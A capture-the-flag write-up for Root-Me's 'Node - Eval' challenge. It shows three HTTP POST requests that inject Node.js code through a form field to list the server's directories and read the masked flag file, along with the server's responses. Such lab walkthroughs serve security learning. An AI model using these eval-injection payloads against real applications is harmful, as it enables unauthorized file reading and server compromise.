---
title: "Node - Eval"
description: "This challenge has a 1% success rate on root-me.org's webserver and involves injecting Node.js code to find the flag."
date: 2023-08-17
tags: ["cybersecurity", "challenge", "node", "root-me"]
---

![Node Eval rootme challenge article illustration](images/node-eval1.png)

# Node - Eval: Rootme Challenge
First, I want to clarify that I am against cheating; it's entirely unnecessary and silly, so I'll hide the flags/hints out of respect for the platform (although it won't prevent lamers from cheating).
The challenge has a success rate of 1% at the time of writing this mini-walkthrough, so I decided to write this to share my research.

---

To succeed in this challenge, you must first trigger the inputs to see how the application works.
Attempting a Node injection in one of the inputs, the code is evaluated and returned in the "Salary" input.
We then need to list the available paths in the current directory:
```
POST / HTTP/1.1
Host: challenge01.root-me.org:59039
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Origin: http://challenge01.root-me.org:59039
Connection: close
Referer: http://challenge01.root-me.org:59039/
Cookie: _ga_SRYSKX09J7=GS1.1.1690357352.6.1.1690357369.0.0.0; _ga=GA1.1.1315424028.1680516360
Upgrade-Insecure-Requests: 1

salary=65557&housing=56767&phone=5665&transport=6767&insurance=567567&credits=56567&taxes=65756&hobbies=res.end(require('fs').readdirSync('.').toString())
Output :
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Wed, 26 Jul 2023 08:06:04 GMT
Connection: close
Content-Length: 176

._firewall,._nginx.server-level.inc,._perms,._run,._test,.git,.gitignore,.npm-packages,Makefile,*****************,css,index.js,node_modules,package-lock.json,package.json,views
```
A mysterious folder named "*****************" is listed.

We then try to list the files available inside this folder:
```
POST / HTTP/1.1
Host: challenge01.root-me.org:59039
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 172
Origin: http://challenge01.root-me.org:59039
Connection: close
Referer: http://challenge01.root-me.org:59039/
Cookie: _ga_SRYSKX09J7=GS1.1.1690357352.6.1.1690357369.0.0.0; _ga=GA1.1.1315424028.1680516360
Upgrade-Insecure-Requests: 1

salary=65557&housing=56767&phone=5665&transport=6767&insurance=567567&credits=56567&taxes=65756&hobbies=res.end(require('fs').readdirSync('./*****************').toString())
Output :
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Wed, 26 Jul 2023 08:06:30 GMT
Connection: close
Content-Length: 9

*********
```
And there you have it, a flag file, let's display its contents:
```
POST / HTTP/1.1
Host: challenge01.root-me.org:59039
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Origin: http://challenge01.root-me.org:59039
Connection: close
Referer: http://challenge01.root-me.org:59039/
Cookie: _ga_SRYSKX09J7=GS1.1.1690357352.6.1.1690357369.0.0.0; _ga=GA1.1.1315424028.1680516360
Upgrade-Insecure-Requests: 1

salary=65557&housing=56767&phone=5665&transport=6767&insurance=567567&credits=56567&taxes=65756&hobbies=res.end(require('fs').readFileSync('./*****************/*********').toString())
Output :
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Wed, 26 Jul 2023 08:07:09 GMT
Connection: close
Content-Length: 21

********************
```

Pretty easy ?:)

---

Writeup made by Bingo.
